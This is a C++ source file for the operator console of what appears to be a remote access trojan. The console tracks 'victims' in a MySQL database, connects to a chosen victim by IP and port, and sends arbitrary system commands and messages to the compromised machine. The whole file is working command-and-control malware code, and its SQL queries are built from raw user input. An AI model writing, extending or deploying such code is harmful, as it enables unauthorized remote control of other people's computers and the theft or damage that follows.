// SunFrog.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Vector>
#include <thread>

#include "../WinNetlib/Single/Single_NetworkHandlerClient.h"
#include "../UsefulFuncts/UsefulFuncts.h"


#include<mysql.h>
#include "../DataBase/DataBase.h"


using namespace std;

enum Commands
{
	SendSystemCMDToVictim,
	MessageVictim,
	Disconnect,
	ConnectToVictim,
	ListVictims,
	Exit,
	Help
};

void recvLoop(Single_NetworkHandlerClient* Victim, string name) {
	while (Victim->IsConnected()) {
		string i;
		Victim->RecvDataT<string>(&i);
		if (i!="") {
			printf("\n");
			UFuncts::printfC("<%s>: %s\n", 3, 0, 0, 0, name.c_str(), i.c_str());
		}
	}
}

bool CommandLoop(Commands c,DataBase DB, Single_NetworkHandlerClient * Victim, string * vicName,thread *recv) {
	int cols = DB.GetNumColumns("victims");
	string input;
	PCSTR ip;
	PCSTR port;
	bool loop=true;
	switch (c)
	{
	case Help:
		UFuncts::printfC("SendSysCmd, MessageVictim, Disconnect, Connect, ListVic, Exit, Help", 6, 0, 0, 0);
		printf("\n");
		break;
	case SendSystemCMDToVictim:
		UFuncts::printfC("Enter Command: ", 5, 0, 0, 0);
		getline(cin, input);
		Victim->SendDataT<string>("CMD");
		Victim->SendDataT<string>(input);
		UFuncts::printfC("Returned:", 6, 0, 0, 0);
		printf("\n");
		Sleep(1000);
		break;
	case MessageVictim:
		while (loop) {
			UFuncts::printfC("Enter Message (type \"esc\" to return): ", 5, 0, 0, 0);
			getline(cin, input);
			if (input == "esc") {
				loop = false;
				continue;
			}
			Victim->SendDataT<string>(input);
			Sleep(2000);
		 };
		break;
	case Disconnect:
		Victim->DisConnect();
		recv->join();
		break;
	case ConnectToVictim:
		UFuncts::printfC("Enter name: ", 5, 0, 0, 0);
		getline(cin, input);
		*vicName = input;
		DB.Query("SELECT IP FROM victims where Name='"+input+"'");
		DB.GetRow();
		cout << DB.row[0] << endl;
		
		ip = DB.row[0];

		DB.Query("SELECT Port FROM victims where Name='" + input + "'");
		DB.GetRow();
		cout << DB.row[0] << endl;

		port = DB.row[0];

		Victim->Init(ip, port);
		Victim->Connect();
		recv = new thread(recvLoop, Victim, *vicName);
		break;
	case ListVictims:
		system("cls");
		DB.Query("SELECT * FROM victims");
		while (DB.GetRow()) {
			for (int i = 0; i < cols; i++)
			{
				UFuncts::printfC("%s ", i+2, 0, 1, 0,DB.row[i]);
			}
			cout << endl;
		}
		break;
	case Exit:
		return false;
		break;
	default:
		break;
	}
	return true;
}


int main(int argc, char** argv)
{
	if (argc < 6) {
		UFuncts::printfC("missing arguments!", 4, 0, 1, 0);
		printf("\n");
		return -1;
	}

	Single_NetworkHandlerClient Victim;

	string vicName="";

	Victim.SetName("Master");

	thread recvThread;

	DataBase RatDB(argv[1], argv[2], argv[3], argv[4], atoi(argv[5]));

	if (RatDB.Init()) {
		UFuncts::printfC("Connected to DB!", 2, 0, 1, 0);
		printf("\n");
	}
	int cols = RatDB.GetNumColumns("victims");	

	bool run = false;
	string input;
	do
	{
		UFuncts::printfC("Currently %d Victims in database.", 4, 0, 1, 0, RatDB.GetNumRows("victims"));
		printf("\n");
		UFuncts::printfC("Currently Connected to %s", 4, 0, 1, 0, vicName.c_str());
		printf("\n");
		UFuncts::printfC("Enter Command: ", 1, 0, 1, 0, RatDB.GetNumRows("victims"));
		getline(cin, input);
		if (input=="exit"||input == "Exit") {
			run = CommandLoop(Exit, RatDB, &Victim, &vicName, &recvThread);
		}
		else if (input == "lsvic" || input == "LsVic") {
			run = CommandLoop(ListVictims, RatDB, &Victim,&vicName, &recvThread);
		}
		else if (input == "connect" || input == "Connect") {
			run = CommandLoop(ConnectToVictim, RatDB, &Victim, &vicName, &recvThread);
		}
		else if (input == "disconnect" || input == "Disconnect") {
			run = CommandLoop(Disconnect, RatDB, &Victim, &vicName, &recvThread);
		}
		else if (input == "messagevictim" || input == "MessageVictim") {
			run = CommandLoop(MessageVictim, RatDB, &Victim, &vicName, &recvThread);
		}
		else if (input == "help" || input == "Help") {
			run = CommandLoop(Help, RatDB, &Victim, &vicName, &recvThread);
		}else if (input == "sendsyscmd" || input == "SendSysCmd") {
			run = CommandLoop(SendSystemCMDToVictim, RatDB, &Victim, &vicName, &recvThread);
		}
	} while (run);

	//recvThread.join();
	Victim.DisConnect();
    return 0;
}

